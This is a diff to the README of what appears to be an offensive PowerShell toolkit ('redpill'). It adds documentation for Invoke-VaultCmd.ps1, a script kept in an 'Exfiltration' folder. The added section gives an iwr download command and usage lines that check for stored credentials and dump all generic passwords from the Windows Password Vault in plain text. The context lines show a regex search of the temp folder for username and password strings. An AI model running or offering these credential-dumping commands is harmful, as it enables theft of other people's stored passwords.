@@ -230,3 +230,34 @@ password=r00t3xp10it
 # Search for 'user,usern,userna,usernam,username,passw,passwo,passwor,password' regex
 .\eviltree_x64.exe -r "$Env:TMP" -x "(.{0,3}user.{0,4}[=]{1}.{0,18}|.{0,3}passw.{0,3}[=]{1}.{0,18})" -v -q
 ```
+
+<br />
+
+## Invoke-VaultCmd.ps1
+
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|Invoke-VaultCmd|Manage Windows Password Vault Items|UserLand|...|
+
+**download cmdLet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1" -OutFile "Invoke-VaultCmd.ps1"
+```
+
+**execute:**
+```powershell
+#cmdlet help
+Get-Help .\Invoke-VaultCmd.ps1 -full
+
+#Check for stored Resource_names with creds
+.\Invoke-VaultCmd.ps1 -action "check"
+
+#Create new vault entry named 'MyCredential' with 'SKYNET\pedro' username and 'r00t3xp10it' as is access password
+.\Invoke-VaultCmd.ps1 -action "create" -resource "MyCredential" -username "SKYNET\pedro" -password "r00t3xp10it"
+
+#Dump ALL generic passwords [plain text] from vault
+.\Invoke-VaultCmd.ps1 -action "dumpall"
+
+#Delete resource 'MyCredential' with 'BillGates' username and comrrespondent creds from vault
+.\Invoke-VaultCmd.ps1 -action "delete" -resource "MyCredential" -username "BillGates"
+```
